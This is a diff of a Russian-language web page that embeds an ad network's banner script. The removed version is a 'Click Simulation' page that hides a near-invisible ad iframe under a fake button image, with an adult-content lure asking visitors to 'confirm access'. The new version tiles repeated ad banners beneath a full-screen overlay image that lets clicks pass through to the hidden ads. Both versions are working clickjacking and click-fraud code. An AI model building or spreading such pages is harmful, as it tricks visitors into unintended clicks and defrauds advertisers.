@@ -2,75 +2,74 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Click Simulation</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Сайт с баннерами и изображением</title>
   <style>
-    body {
+    body, html {
       margin: 0;
+      padding: 0;
+      height: 100%;
       background-color: #000;
       font-family: Arial, sans-serif;
-      overflow-x: hidden;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
+      overflow: hidden;
     }
 
-    .click-wrapper {
+    .container {
       position: relative;
-      width: 300px;
-      height: 250px;
-      margin-top: 50px;
+      width: 100%;
+      height: 100vh;
     }
 
-    .fake-ui {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 300px;
-      height: 250px;
-      z-index: 2;
-      pointer-events: none;
-    }
-
-    .real-banner {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 300px;
-      height: 250px;
-      opacity: 0.01; /* Делает iframe невидимым */
+    .banner-grid {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      padding: 10px;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
       z-index: 1;
     }
 
-    .title {
-      color: #ff00ff;
-      font-size: 22px;
-      margin-top: 30px;
-      text-shadow: 0 0 10px #ff00ff;
+    .banner {
+      width: 300px;
+      height: 250px;
+      background-color: #111;
+    }
+
+    .overlay-image {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      opacity: 0.8;
+      z-index: 2;
+      pointer-events: none;
     }
   </style>
 </head>
 <body>
 
-  <div class="title">🔞 Подтверди доступ</div>
-
-  <div class="click-wrapper">
-    <!-- Невидимый iframe баннер -->
-    <div class="real-banner" id="banner-holder"></div>
-
-    <!-- Картинка-обманка -->
-    <img class="fake-ui" src="IMG_20250719_192733_771.jpg" alt="Fake Button UI">
+<div class="container">
+  <div class="banner-grid">
+    <div class="banner">
+      <script type="text/javascript">
+        atOptions = {
+          'key' : 'a3c6441495bba3b9a180be372364178d',
+          'format' : 'iframe',
+          'height' : 250,
+          'width' : 300,
+          'params' : {}
+        };
+      </script>
+      <script type="text/javascript" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></script>
+    </div>
+    <!-- Копируй этот блок <div class="banner">...</div> ещё столько раз, сколько нужно баннеров -->
   </div>
 
-  <script type="text/javascript">
-    atOptions = {
-      'key' : 'a3c6441495bba3b9a180be372364178d',
-      'format' : 'iframe',
-      'height' : 250,
-      'width' : 300,
-      'params' : {}
-    };
-  </script>
-  <script type="text/javascript" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></script>
+  <img src="IMG_20250719_192733_771.jpg" alt="Overlay" class="overlay-image">
+</div>
+
 </body>
 </html>
